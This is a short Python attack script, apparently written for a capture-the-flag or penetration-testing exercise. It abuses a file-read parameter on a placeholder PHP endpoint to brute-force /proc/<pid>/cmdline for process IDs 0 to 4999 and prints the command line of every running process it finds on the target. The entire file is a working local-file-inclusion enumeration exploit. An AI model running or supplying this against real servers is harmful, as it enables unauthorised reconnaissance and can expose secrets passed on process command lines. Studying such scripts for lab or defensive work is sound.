#!/bin/python3

import signal
import requests
import sys

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Stopping the process...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://[SERVER]/[path]/file.php?enum=/proc/"
empty_resp = 125

p1 = log.progress("Brute force")
p1.status("Starting brute force attack")

for pid in range(0,5000):
    p1.status("Testing pid %d" % (pid))
    content = (requests.get(main_url + str(pid) + "/cmdline")).content
    if (len(content) > empty_resp):
        print(f"[+] Process {pid} found")
        print(content)
        print("--------------------------------------------\n")
